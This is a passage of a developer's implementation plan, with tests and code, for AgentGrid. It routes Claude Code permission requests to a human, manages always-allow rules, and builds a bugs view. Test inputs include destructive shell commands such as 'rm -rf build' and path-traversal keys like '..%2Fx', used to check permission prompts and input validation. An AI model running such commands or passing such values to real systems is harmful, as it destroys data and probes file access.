import { until } from "../helpers/until.js";

let app: ReturnType<typeof createApp>; let broker: PermissionBroker; let rules: RulesStore;
const TOKEN = "t".repeat(64);
const body = { session_id: "s1", tool_name: "Bash", tool_input: { command: "npm test" }, permission_suggestions: [] };
beforeEach(async () => {
  const home = await mkdtemp(path.join(tmpdir(), "hook-"));
  const store = new Store(home, path.resolve("roles")); await store.init();
  rules = new RulesStore(home); await rules.load(); broker = new PermissionBroker(rules);
  app = createApp({ store, manager: new Manager(store, { queryFn: makeFakeQuery().queryFn }), permissions: { broker, rules },
    hookToken: () => TOKEN, agentForSession: sid => (sid === "s1" ? "rev@r" : null) });
});

describe("POST /api/hooks/permission", () => {
  it("needs the token and is never a browser", async () => {
    await request(app).post("/api/hooks/permission").send(body).expect(401);
    await request(app).post("/api/hooks/permission").set("Authorization", "Bearer wrong").send(body).expect(401);
    await request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).set("Sec-Fetch-Site", "same-origin").send(body).expect(403);
  });
  it("waits for the human, answered from the agent's answer route", async () => {
    const pending = request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).send(body).then(r => r);
    await until(() => broker.list().length === 1);
    const id = broker.list()[0].id;
    await request(app).post("/api/agents/rev@r/answer").send({ toolUseId: id, decision: { kind: "allow" } }).expect(204);
    expect((await pending).body).toEqual({ decision: { behavior: "allow" } });
    await request(app).post("/api/agents/rev@r/answer").send({ toolUseId: id, decision: { kind: "allow" } }).expect(409);   // Review Focus 1
  });
  it("a rule answers at once; no owning agent, a question, or a cancel all mean no decision", async () => {
    await rules.add("Bash(npm test:*)");
    expect((await request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).send(body)).body).toEqual({ decision: { behavior: "allow" } });
    expect((await request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).send({ ...body, session_id: "other" })).body).toEqual({ decision: null });
    expect((await request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).send({ ...body, tool_name: "AskUserQuestion", tool_input: {} })).body).toEqual({ decision: null });
    const p = request(app).post("/api/hooks/permission").set("Authorization", `Bearer ${TOKEN}`).send({ ...body, tool_input: { command: "rm x" } }).then(r => r);
    await until(() => broker.list().length === 1); broker.cancel(broker.list()[0].id);
    expect((await p).body).toEqual({ decision: null });
  });
  // Review Focus 3
  it("the hook's connection closing cancels the request", async () => {
    const server = http.createServer(app).listen(0); const port = (server.address() as any).port;
    const r = http.request({ port, method: "POST", path: "/api/hooks/permission", headers: { "content-type": "application/json", authorization: `Bearer ${TOKEN}` } });
    r.on("error", () => {}); r.end(JSON.stringify({ ...body, tool_input: { command: "rm y" } }));
    await until(() => broker.list().length === 1); r.destroy();
    await until(() => broker.list().length === 0); server.close();
  });
});

describe("permission-hook.mjs", () => {
  const hook = path.resolve("presets/hooks/permission-hook.mjs");
  const runHook = (env: Record<string, string>, stdin: string) => new Promise<{ out: string; code: number }>(res => {
    const c = execFile(process.execPath, [hook], { env: { ...process.env, ...env } }, (err, out) => res({ out: String(out), code: err ? (err as any).code ?? 1 : 0 }));
    c.stdin!.end(stdin);
  });
  it("prints the decision as Claude Code's hook output", async () => {
    const server = http.createServer((req, res) => { let b = ""; req.on("data", c => b += c); req.on("end", () => {
      expect(req.headers.authorization).toBe("Bearer k"); expect(JSON.parse(b).tool_name).toBe("Bash");
      res.setHeader("content-type", "application/json"); res.end(JSON.stringify({ decision: { behavior: "deny", message: "no" } })); }); }).listen(0);
    const r = await runHook({ AGENTGRID_URL: `http://127.0.0.1:${(server.address() as any).port}`, AGENTGRID_HOOK_TOKEN: "k" }, JSON.stringify(body));
    server.close();
    expect(r.code).toBe(0);
    expect(JSON.parse(r.out)).toEqual({ hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "deny", message: "no" } } });
  });
  it("prints nothing and exits 0 when AgentGrid can't be reached, or has no decision", async () => {
    expect(await runHook({ AGENTGRID_URL: "http://127.0.0.1:1", AGENTGRID_HOOK_TOKEN: "k" }, JSON.stringify(body))).toEqual({ out: "", code: 0 });
    expect(await runHook({}, JSON.stringify(body))).toEqual({ out: "", code: 0 });
    expect(await runHook({ AGENTGRID_URL: "http://127.0.0.1:1", AGENTGRID_HOOK_TOKEN: "k" }, "not json")).toEqual({ out: "", code: 0 });
  });
});
```

- [ ] **Step 2: Run it.** Command: `cd server && npx vitest run test/permissions/hook.test.ts`.
  Expected: FAIL (404 for the route; the hook file is missing).
- [ ] **Step 3: Implement the script.** `presets/hooks/permission-hook.mjs` uses `node:http`, not
  `fetch`: undici's 300 s headers timeout would cut a long wait short.

```js
#!/usr/bin/env node
// AgentGrid's PermissionRequest hook. Asks the AgentGrid server that launched this session, and waits.
// It never decides on its own: on any failure it prints nothing and exits 0, and Claude Code asks in the terminal.
import http from "node:http";
const done = () => process.exit(0);
try {
  const chunks = []; for await (const c of process.stdin) chunks.push(c);
  const input = JSON.parse(Buffer.concat(chunks).toString("utf8"));
  const base = process.env.AGENTGRID_URL, token = process.env.AGENTGRID_HOOK_TOKEN;
  if (!base || !token) done();
  const url = new URL("/api/hooks/permission", base);
  const payload = JSON.stringify(input);
  const req = http.request(url, { method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(payload), authorization: `Bearer ${token}` } }, res => {
    let b = ""; res.setEncoding("utf8"); res.on("data", c => (b += c));
    res.on("end", () => {
      try {
        const decision = res.statusCode === 200 ? JSON.parse(b).decision : null;
        if (decision && (decision.behavior === "allow" || decision.behavior === "deny")) process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: "PermissionRequest", decision } }));
      } catch { /* no decision */ }
      done();
    });
  });
  req.on("error", done);
  req.end(payload);
} catch { done(); }
```

- [ ] **Step 4: Implement the route** in `app.ts`. Place it before the generic `/api` cross-site guard
  if that guard would 403 first; otherwise its own check suffices. Answer routing goes in the existing
  answer route.

```ts
import { timingSafeEqual } from "node:crypto";
const sameToken = (a: string, b: string) => a.length === b.length && timingSafeEqual(Buffer.from(a), Buffer.from(b));

app.post("/api/hooks/permission", wrap(async (req, res) => {
  if (req.get("sec-fetch-site")) { res.status(403).json({ error: "not for browsers" }); return; }
  const token = deps.hookToken?.(); const given = (req.get("authorization") ?? "").replace(/^Bearer /, "");
  if (!token || !sameToken(given, token)) { res.status(401).json({ error: "bad token" }); return; }
  const p = deps.permissions; const b = req.body ?? {};
  const toolName = typeof b.tool_name === "string" ? b.tool_name : ""; const input = b.tool_input && typeof b.tool_input === "object" ? b.tool_input : {};
  const sessionId = typeof b.session_id === "string" ? b.session_id : "";
  const agentId = sessionId ? deps.agentForSession?.(sessionId) ?? null : null;
  if (!p || !toolName || toolName === "AskUserQuestion" || !agentId) { res.json({ decision: null }); return; }
  if (p.broker.allowed(toolName, input)) { res.json({ decision: { behavior: "allow" } }); return; }
  const { id, decision } = p.broker.ask({ agentId, source: "terminal", sessionId, toolName, input, suggestions: Array.isArray(b.permission_suggestions) ? b.permission_suggestions : [] });
  res.on("close", () => { if (!res.writableEnded) p.broker.cancel(id); });
  res.json({ decision: await decision });
}));
```

  In the answer route:
  `if (deps.permissions?.broker.has(toolUseId)) { const r = deps.permissions.broker.list().find(x => x.id === toolUseId); if (r?.agentId !== req.params.id) throw new NotFound(...); await deps.permissions.broker.answer(toolUseId, decision); res.status(204).end(); return; }`.
  Everything else falls through to `manager.answer` as before.

- [ ] **Step 5: Run the tests and a typecheck.** Expected: PASS. Then run the full server suite.
- [ ] **Step 6: Commit** with the message
  `feat(server): PermissionRequest hook — terminal sessions ask AgentGrid, which waits for you`.

---

### Task 6: Embedded terminals launch with the hook; their exit cancels requests

**Files:**
- Modify: `server/src/pty.ts`, `server/src/start.ts`
- Test: `server/test/pty.test.ts` (append), `server/test/start.test.ts` (append, if it already starts a
  server in fake mode)

**Interfaces:**
- Produces:
  ```ts
  // PtyManager
  configureHook(h: { settings: string; env: Record<string, string> } | null): void;
  onSessionExit(cb: (sessionId: string) => void): void;
  /** The shell command Claude Code runs for the hook — Electron needs ELECTRON_RUN_AS_NODE. */
  export function hookCommand(execPath: string, hookFile: string, electron: boolean): string;
  export function hookSettings(command: string): string;   // the --settings JSON
  ```
  `start.ts` wiring:
  - `RulesStore` + `PermissionBroker`;
  - broker events forwarded to `store.emit("event", …)`;
  - `store.permissions = () => broker.list()`;
  - `agentForSession` (the same ownership rule as `resolveLaunch`: `resumeSessionId` or any assignment
    with that `sessionId`);
  - a per-start token (`randomBytes(32).toString("hex")`);
  - `ptys.configureHook` after `listen` (the URL is known only then);
  - `ptys.onSessionExit(sid => broker.cancelSession(sid))`.

- [ ] **Step 1: Write the failing tests** (pty).

```ts
it("adds the hook to --resume launches only, with its env, and reports exits", () => {
  const { spawned, mgr } = setup();
  const exits: string[] = []; mgr.onSessionExit(s => exits.push(s));
  mgr.configureHook({ settings: '{"hooks":{}}', env: { AGENTGRID_URL: "http://127.0.0.1:1", AGENTGRID_HOOK_TOKEN: "k" } });
  mgr.attach("s1", { cwd: "/r", argv: ["--resume", "s1"], cols: 80, rows: 24 }, () => {}, () => {});
  mgr.attach("s2", { cwd: "/r", argv: ["attach", "bg2"], cols: 80, rows: 24 }, () => {}, () => {});
  expect(spawned[0].args).toEqual(["--resume", "s1", "--settings", '{"hooks":{}}']);
  expect(spawned[0].opts.env).toMatchObject({ AGENTGRID_URL: "http://127.0.0.1:1", AGENTGRID_HOOK_TOKEN: "k" });
  expect(spawned[1].args).toEqual(["attach", "bg2"]);
  expect(spawned[1].opts.env.AGENTGRID_HOOK_TOKEN).toBeUndefined();
  spawned[0].pty.kill();
  expect(exits).toEqual(["s1"]);
});
it("hook command and settings", () => {
  expect(hookCommand("/usr/bin/node", "/p/hook.mjs", false)).toBe("'/usr/bin/node' '/p/hook.mjs'");
  expect(hookCommand("/A G.app/x", "/p/h.mjs", true)).toBe("ELECTRON_RUN_AS_NODE=1 '/A G.app/x' '/p/h.mjs'");
  expect(JSON.parse(hookSettings("cmd"))).toEqual({ hooks: { PermissionRequest: [{ matcher: "*", hooks: [{ type: "command", command: "cmd", timeout: 86400 }] }] } });
});
```

  `shellQuote` (`server/src/shell.ts`) is the quoting used. If it quotes differently from `'…'`, match
  its output in the expectation and keep using it.

- [ ] **Step 2: Run it.** Expected: FAIL.
- [ ] **Step 3: Implement it in `pty.ts`.**
  - Fields: `private hook: {settings; env} | null = null;` and `private exitCbs: Array<(s: string) => void> = [];`.
  - In `attach` when spawning: `const withHook = this.hook && opts.argv[0] === "--resume";`, then
    args `withHook ? [...opts.argv, "--settings", this.hook.settings] : opts.argv` and env
    `withHook ? { ...cleanEnv(), ...this.hook.env } : cleanEnv()`.
  - In `onExit`, after deleting the entry: `for (const cb of this.exitCbs) cb(sessionId);`.
  - Export `hookCommand` (built with `shellQuote`) and `hookSettings`.
- [ ] **Step 4: Wire `start.ts`.**
  - `const rules = new RulesStore(home); await rules.load(); const permissionBroker = new PermissionBroker(rules); permissionBroker.on("event", e => store.emit("event", e)); store.permissions = () => permissionBroker.list();`
  - Pass `rules` to `new Manager(...)`.
  - Pass `permissions: { broker: permissionBroker, rules }`, `hookToken: () => hookToken` and
    `agentForSession` to `createApp`.
  - After `listen`:
    `hookToken = randomBytes(32).toString("hex"); ptys.configureHook({ settings: hookSettings(hookCommand(process.execPath, path.join(presetsDir, "hooks", "permission-hook.mjs"), !!process.versions.electron)), env: { AGENTGRID_URL: url, AGENTGRID_HOOK_TOKEN: hookToken } });`.
  - `ptys.onSessionExit(sid => permissionBroker.cancelSession(sid));`
  - `presetsDir` is resolved before this point already. Make sure `rules` is created before `Manager`.
- [ ] **Step 5: Run the full server suite and a typecheck.** Expected: PASS.
- [ ] **Step 6: Live check (manual, recorded in the ledger).**
  - Run `npm run dev` (or the server script), open an agent's Terminal tab, and ask it to run a command
    that needs permission.
  - Confirm the request appears via `curl -s localhost:4800/api/state | jq .permissions`.
  - Answer it with `curl -X POST …/answer`, and confirm the terminal continues.
  - If the environment can't run a real `claude`, record that and rely on Task 1's spike.
- [ ] **Step 7: Commit** with the message
  `feat(server): embedded terminals ask AgentGrid for permission; their requests end with them`.

---

### Task 7: Stop reading a running tool as "needs approval" (defect #2)

**Files:**
- Modify: `server/src/types.ts` (`SessionActivity`: drop `pendingTool`, add `runningTool?: { name: string; summary: string }`),
  `server/src/sessionStatus.ts`, `ui/src/state/attention.ts`, `ui/src/state/reducer.ts`,
  `ui/src/App.tsx`, `ui/src/components/AgentTile.tsx`, `ui/src/components/SidePanel.tsx`
- Test: `server/test/sessionStatus.test.ts`, `ui/test/attention.test.ts`, `ui/test/reducer.test.ts`,
  `ui/test/AgentTile.test.tsx`

**Interfaces:**
- Consumes: `PermissionRequest`, the `permission`/`permission-settled` events (Task 3).
- Produces:
  - `UiState.permissions: Record<string, PermissionRequest>`.
  - `permissionFor(s, agent): PermissionRequest | null`, which returns the oldest request for that
    agent.
  - `attention(agent, a, activity, permission?)`:
    - a permission → `{ kind: "request" }`;
    - `activity.phase === "waiting"` (questions only now) →
      `{ kind: "terminal", text: "Asking you in the terminal: …" }`.

- [ ] **Step 1: Write the failing tests.**
  - **Server** `deriveStatus`:
    - an assistant `tool_use` Bash with no result → `phase: "working"`,
      `runningTool: { name: "Bash", summary: "npm test" }`, no `pendingTool`;
    - an open `AskUserQuestion` → `phase: "waiting"` with `question`.
  - **UI attention** (Review Focus 4):
    - `attention(agent("free"), null, act({ phase: "working", runningTool: { name: "Bash", summary: "x" } }))`
      is `null`;
    - `attention(agent("done"), asg({outcome:"ok"}), null, req)` is `{ kind: "request" }`.
  - **Reducer:**
    - a snapshot with `permissions: [req]` fills `s.permissions`;
    - a `permission` event adds, and `permission-settled` removes;
    - `waitingIds` includes the agent with a request.
  - **Tile:** a free agent with
    `activity={{ phase: "working", runningTool: { name: "Bash", summary: "npm test" } }}` shows
    `Working in the terminal: Bash` and state `Idle` (not Needs you).
  - Update the existing tests that build `pendingTool` activity to the new shape. The "Needs approval
    in the terminal: Bash" expectations move to Task 8, where a broker request drives them.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.**
  - **`deriveStatus`:** `phase = openTools.size > 0 ? ([...openTools.values()].some(t => t.name === "AskUserQuestion") ? "waiting" : "working") : …`.
    Set `out.runningTool` from the last non-question open tool.
  - **Reducer:** add `permissions` to `initial`, `snapshot` (`a.state.permissions ?? []`) and
    `change`. Add `permissionFor`. `needsYou` passes `permissionFor(s, agent)` to `attention`.
  - **`attention`:** the new first rule, after `waiting`:
    `if (permission) return { kind: "request" };`. Delete the `pendingTool` branch.
  - **`App.tsx` notifications:**
    - in the activity effect, notify only for `act.question` (phase `waiting`);
    - add an effect over `s.permissions` that keeps a `seen` ref of ids and calls
      `notifyWaiting(agentName, \`wants to run ${req.toolName}\`)` once per new id.
  - **`AgentTile`'s free-agent phase line:** `working` → `Working in the terminal${activity.runningTool ? `: ${activity.runningTool.name}` : ""}`.
  - **`SidePanel`'s status head:** `working` shows `runningTool` the same way. The waiting text is only
    "Asking you a question".
- [ ] **Step 4: Run both suites and both typechecks.** Expected: PASS.
- [ ] **Step 5: Commit** with the message
  `fix: a running tool is not a permission prompt — "needs you" comes from real requests and questions`.

---

### Task 8: One permission card, everywhere

**Files:**
- Modify: `ui/src/components/PendingPrompt.tsx`, `AgentTile.tsx`, `SidePanel.tsx`, `BugScreen.tsx`,
  `App.tsx`, `ui/src/api.ts` (unchanged route; `answer` already takes `toolUseId`)
- Test: `ui/test/PendingPrompt.test.tsx`, `ui/test/AgentTile.test.tsx`, `ui/test/SidePanel.test.tsx`,
  `ui/test/BugScreen.test.tsx`

**Interfaces:**
- Consumes: `Pending.suggestedRule`/`ruleIsBroad` (Task 4), `PermissionRequest` and `permissionFor`
  (Task 7).
- Produces:
  ```ts
  /** A broker request as the card's Pending. */
  export const asPending = (r: PermissionRequest): Pending => ({ kind: "permission", toolUseId: r.id, toolName: r.toolName, input: r.input, suggestions: [], suggestedRule: r.suggestedRule, ruleIsBroad: r.ruleIsBroad });
  ```
  - `PendingPrompt`'s permission card has Allow, `Always allow <rule>` and Deny.
  - For a broad rule, the first click on Always allow turns the button into
    `Confirm: always allow every <shell command | file change>`. The second click sends `always`, and
    any other click resets it.
  - `TileRequest` uses the same card in its compact form.
  - Agent tile, side panel and Bugs "Now" panel each render the card for
    `asg?.pending ?? (permissionFor(s, agent) && asPending(...))`.

- [ ] **Step 1: Write the failing tests.**

```tsx
// PendingPrompt.test.tsx (append)
it("names the rule Always allow saves, and asks again for a broad one", async () => {
  const onDecide = vi.fn();
  const p = { kind: "permission" as const, toolUseId: "t", toolName: "Bash", input: { command: "rm -rf build" }, suggestions: [], suggestedRule: "Bash", ruleIsBroad: true };
  render(<PendingPrompt pending={p} onDecide={onDecide} />);
  await userEvent.click(screen.getByRole("button", { name: "Always allow Bash" }));
  expect(onDecide).not.toHaveBeenCalled();
  await userEvent.click(screen.getByRole("button", { name: "Confirm: always allow every shell command" }));
  expect(onDecide).toHaveBeenCalledWith({ kind: "always" });
});
it("a narrow rule is one click", async () => {
  const onDecide = vi.fn();
  render(<PendingPrompt pending={{ kind: "permission", toolUseId: "t", toolName: "Bash", input: { command: "npm test" }, suggestions: [], suggestedRule: "Bash(npm test:*)", ruleIsBroad: false }} onDecide={onDecide} />);
  await userEvent.click(screen.getByRole("button", { name: "Always allow Bash(npm test:*)" }));
  expect(onDecide).toHaveBeenCalledWith({ kind: "always" });
});
```

  Further tests:
  - **Side panel:** with `permission={req}` (a new prop) for a free agent, Allow calls
    `onDecide(agent.id, req.id, { kind: "allow" })`.
  - **Bugs screen:** a state whose `permissions` holds a request for the task's agent shows the card in
    the Now panel. Clicking Allow calls the screen's new `onDecide` prop with `(agentId, req.id, {kind:"allow"})`.
  - **Tile:** a done agent with a broker request shows Needs you and an Allow button, and Allow calls
    `onDecide(agent.id, req.id, …)`.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.**
  - **`PendingPrompt`:** local `confirming` state. The label is
    `confirming ? \`Confirm: always allow every ${p.toolName === "Bash" ? "shell command" : "file change"}\` : \`Always allow ${p.suggestedRule}\``.
    It always renders, because a rule can always be derived.
  - **`TileRequest`:** takes `pending: Pending | null` (computed by the tile from
    `a?.pending ?? (permission ? asPending(permission) : null)`) and renders Allow, `Always allow…`
    (compact `btn sm`, same confirm behaviour) and Deny.
  - **`SidePanel`:** a new `permission?: PermissionRequest | null` prop. Above the session status, it
    renders `<PendingPrompt who={agent.displayName} pending={asPending(permission)} onDecide={d => onDecide(agent.id, permission.id, d)} />`.
  - **`BugScreen`/`BugDetail`:** a new `onDecide` prop. In the Now panel, it renders the card for
    `pending ?? permission`.
  - **`App.tsx`:** pass `permission={selected ? permissionFor(s, selected) : null}` to `SidePanel`.
    Pass `onDecide={decide}` to `BugScreen`, and `permissionFor` to the grid's tiles through
    `AgentGrid`, as `activityFor` is passed.
  - **Keyboard:** the `allow`/`deny` handlers in `useKeyboard` also act on `permissionFor(s, selected)`
    when there is no SDK pending.
- [ ] **Step 4: Run the UI suite and a typecheck.** Expected: PASS.
- [ ] **Step 5: Commit** with the message
  `feat(ui): answer any permission from the card, the side panel or the bug — Always allow names its rule`.

---

### Task 9: Settings — "Always allowed"

**Files:**
- Modify: `server/src/api/app.ts`, `ui/src/api.ts`, `ui/src/components/SettingsDialog.tsx`
- Test: `server/test/permissions/hook.test.ts` (append the routes), `ui/src/components/SettingsDialog.test.tsx`
  (append)

**Interfaces:**
- Produces:
  - `GET /api/permissions/rules` → `{ rules: SavedRule[]; problem: string | null }`;
  - `DELETE /api/permissions/rules` with body `{ rule }` → the same shape;
  - `api.listRules()`, `api.removeRule(rule)`.

- [ ] **Step 1: Write the failing tests.**
  - **Server:** GET returns the rules and `problem`; DELETE removes one; 501 when `permissions` is not
    wired.
  - **UI:** the Settings dialog shows a section headed **Always allowed**:
    - each rule appears in mono with an `added <relative time>` note;
    - the Remove button calls `removeRule("Bash(npm test:*)")`, and the row disappears;
    - with no rules, it reads "Nothing yet — use Always allow on a request to add a rule.";
    - a `problem` renders as a warning line.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement** the routes, the API calls, and a `.sec` section in `SettingsDialog`,
  following the existing section markup (readiness banner styles, `.sec` heading, `.help`
  descriptions). Section description: "Requests matching these rules are approved without asking —
  for every agent, bug fix and embedded terminal."
- [ ] **Step 4: Run both suites.** Expected: PASS.
- [ ] **Step 5: Commit** with the message
  `feat: Settings lists always-allowed rules, each removable`.

---

### Task 10: The combined Bugs view

**Files:**
- Create: `ui/src/hooks/useBugStart.ts`, `ui/src/components/TicketDetail.tsx`, `ui/test/TicketDetail.test.tsx`
- Modify:
  - `server/src/api/app.ts` (`GET /api/bugfix/issues/:key`);
  - `ui/src/api.ts` (`issue(key)`);
  - `ui/src/hooks/useHashRoute.ts` (`ticket`);
  - `ui/src/components/BugScreen.tsx` (merged list);
  - `ui/src/components/BugLauncher.tsx` (use `useBugStart`);
  - `ui/src/App.tsx` (routing);
  - `ui/src/styles.css`.
- Test: `server/test/bugfix/api.test.ts`, `ui/test/useHashRoute.test.ts`, `ui/test/BugScreen.test.tsx`,
  `ui/test/BugLauncher.test.tsx` (must stay green)

**Interfaces:**
- Produces:
  ```ts
  // useHashRoute
  export type Route = { view: "grid" | "bugs"; bugId: string | null; ticket: string | null };
  // parseHash("#/bugs/ticket/PAY-42") → { view: "bugs", bugId: null, ticket: "PAY-42" }; keys must match /^[A-Za-z][A-Za-z0-9_]*-\d+$/
  // go({ view: "bugs", ticket: "PAY-42" })
  // useBugStart
  export function useBugStart(opts: { issueRef: string; initialRepo?: string; onCreated?: (t: BugTask) => void }): {
    repo: string; setRepo(v: string): void; repoValid: boolean;
    preflight: Preflight | null; checking: boolean; base: string; setBase(v: string): void;
    mergePolicy: "ask" | "auto"; setMergePolicy(v: "ask" | "auto"): void;
    busy: boolean; err: string | null; alreadyOnBase: boolean; blocked: boolean; startTitle: string;
    start(startAnyway?: boolean): Promise<void>;
  };
  // BugScreen rows
  type Row = { key: string; title: string; priority: string | null; task: BugTask | null; assigned: boolean };
  export function mergeRows(issues: IssueSummary[] | null, tasks: BugTask[]): Row[];   // exported for tests
  ```
  - `GET /api/bugfix/issues/:key` → `TrackerIssue`. It validates the key with the same rule as
    `assertIssueKey`, returns 400 on a bad key, and 501 when the bug-fix workflow is not wired.

- [ ] **Step 1: Write the failing server test.** `GET /api/bugfix/issues/PAY-42` returns the fake
  tracker's issue; `GET /api/bugfix/issues/..%2Fx` → 400. Implement the route. Run it, then commit
  `feat(server): read one ticket for the bugs view`.
- [ ] **Step 2: Write the failing route tests.**
  - `parseHash("#/bugs/ticket/PAY-42")` gives the ticket;
  - `#/bugs/ticket/../x` gives `ticket: null`;
  - `go({view:"bugs", ticket:"PAY-42"})` sets the hash to `#/bugs/ticket/PAY-42`;
  - the existing route tests stay green.

  Implement, run, and commit `feat(ui): ticket routes on the bugs screen`.
- [ ] **Step 3: Extract `useBugStart`.**
  - Move the repo, preflight, base, merge-policy, already-on-base and start logic out of
    `BugLauncher.tsx` unchanged into `useBugStart`. The launcher renders the same markup from the
    hook's values.
  - Remembered repo per project: the hook reads `api.getIntegrations()` and pre-fills
    `projectRepos[key prefix]` when `issueRef` changes and `repo` is empty.
  - Run `npx vitest run test/BugLauncher.test.tsx`. Expected: PASS, unchanged, because this is a
    refactor.
  - Commit `refactor(ui): bug-start logic in a hook, shared by the launcher and the ticket view`.
- [ ] **Step 4: Write the failing BugScreen tests** (mock `api.myIssues` and `api.issue` in
  `BugScreen.test.tsx`):

```tsx
it("lists every open bug assigned to me, started or not, active first", async () => {
  myIssues.mockResolvedValue([{ key: "PAY-1", title: "Not started", url: "u", status: "Open", priority: "High" }, { key: "PAY-42", title: "Started", url: "u", status: "Open", priority: "Low" }]);
  render(<BugScreen {...props} state={stateWith([task("implementing", { issue: { ...ISSUE, key: "PAY-42", title: "Started" } })])} />);
  const rows = await screen.findAllByRole("option");
  expect(rows.map(r => r.querySelector(".k")!.textContent)).toEqual(["PAY-42", "PAY-1"]);
  expect(rows[1]).toHaveTextContent("Not started"); expect(rows[1]).toHaveTextContent("High");
});
it("a started task whose ticket left my list sits in its own group", async () => { /* task PAY-9 not in myIssues → under "Not assigned to you or closed" */ });
// Review Focus 5
it("with the tracker down, started tasks still show, with the error and a Refresh", async () => {
  myIssues.mockRejectedValue(new Error("tracker unavailable"));
  render(<BugScreen {...props} state={stateWith([task("monitoring")])} />);
  expect(await screen.findByText(/tracker unavailable/)).toBeInTheDocument();
  expect(screen.getAllByRole("option")).toHaveLength(1);
  expect(screen.getByRole("button", { name: /refresh/i })).toBeInTheDocument();
});
it("clicking an unstarted bug routes to its ticket", async () => { /* onSelectTicket called with "PAY-1" */ });
it("the empty state shows only when there are no tasks and no assigned bugs", async () => { /* myIssues [] and no tasks → "No bug fixes yet" */ });
```

  `TicketDetail.test.tsx`:
  - it shows the ticket's title, priority, status, the description and the acceptance criteria
    (rendered via `Markdown`, with no raw `#`);
  - Start fixing calls `createBugTask({ issueRef: "PAY-1", repo, mergePolicy: "ask", baseBranch: "develop" })`
    and then `onCreated` with the task;
  - an `already-on-base` refusal shows the commits and Start anyway;
  - a fetch error shows inline with Retry.
- [ ] **Step 5: Run them.** Expected: FAIL.
- [ ] **Step 6: Implement.**
  - **`mergeRows`:**
    - one row per issue key, with its task attached if any;
    - one row per task whose key is not in issues, with `assigned: false`;
    - ordering: tasks with `listStatus` in waiting/running/failed first (the existing `ACTIVE_FIRST`
      order); then unstarted assigned bugs, in tracker order; then finished assigned tasks; then the
      `assigned: false` group.
  - **`BugScreen`:**
    - it loads `api.myIssues()` on mount and every 5 minutes, and keeps the last good list;
    - on an error, it shows `.warnline` "Couldn't refresh from the tracker: <msg>" plus Refresh, and
      marks the list stale;
    - the selection is `selectedId` (task) or the new `selectedTicket` prop;
    - row click: a task → `onSelect(taskId)`; no task → `onSelectTicket(key)`;
    - the right side is `BugDetail` for a task, or `TicketDetail` for a ticket.
  - **`TicketDetail`:**
    - it fetches `api.issue(key)`;
    - header: key, title, priority chip, status, Ticket link;
    - `Markdown` for the description, and a list for the acceptance criteria;
    - a Start panel built from `useBugStart` (repo with Browse, Branch from, merge-policy radios as in
      the launcher, Start fixing, errors, Start anyway);
    - `onCreated` → the App routes to `#/bugs/<taskId>`.
  - **`App.tsx`:** pass `selectedTicket={route.ticket}`,
    `onSelectTicket={k => route.go({ view: "bugs", ticket: k })}`, and
    `onStarted={t => route.go({ view: "bugs", bugId: t.id })}`.
  - **Styles:** a `.ticket` panel reusing `.panel`/`.dhead`, and `.buglist .group` for the collapsed
    group heading.
- [ ] **Step 7: Run the UI suite, a typecheck, and the e2e tests.** Expected: PASS.
- [ ] **Step 8: Commit** with the message
  `feat(ui): the bugs screen lists every bug assigned to you; an unstarted one opens with an inline Start`.

---

### Task 11: End-to-end, version, docs

**Files:**
- Modify: `ui/e2e/bugfix.spec.ts` (or a new `ui/e2e/bugs-view.spec.ts`), `desktop/package.json`
- Test: Playwright in fake mode

- [ ] **Step 1: Add an e2e test.**
  - Open the Bugs view; the fake tracker's `FAKE-1` is listed as not started.
  - Click it; the ticket title and Start panel show.
  - Fill the fake repo (the same fixture `bugfix.spec.ts` uses); Start fixing; the URL becomes
    `#/bugs/bt1`, and the pipeline shows.
- [ ] **Step 2: Add an e2e test for an embedded-session permission, if fake mode can raise one.**
  - Check whether `server/src/fake` has a hook-capable fake terminal.
  - If not, add a test-only fake-mode route `POST /api/fake/permission` (`fake` only, 404 otherwise)
    that calls `broker.ask` for the first agent's session.
  - The test opens Details, sees the card, clicks Allow, and the card disappears.
  - Record a ruling if this needs the fake route.
- [ ] **Step 3: Bump `desktop/package.json` to 0.11.0.** Run `npm test`, then `cd ui && npm run e2e`.
  Expected: all pass.
- [ ] **Step 4: Commit** with the message `test(e2e): bugs view start and a permission answered from Details; 0.11.0`.
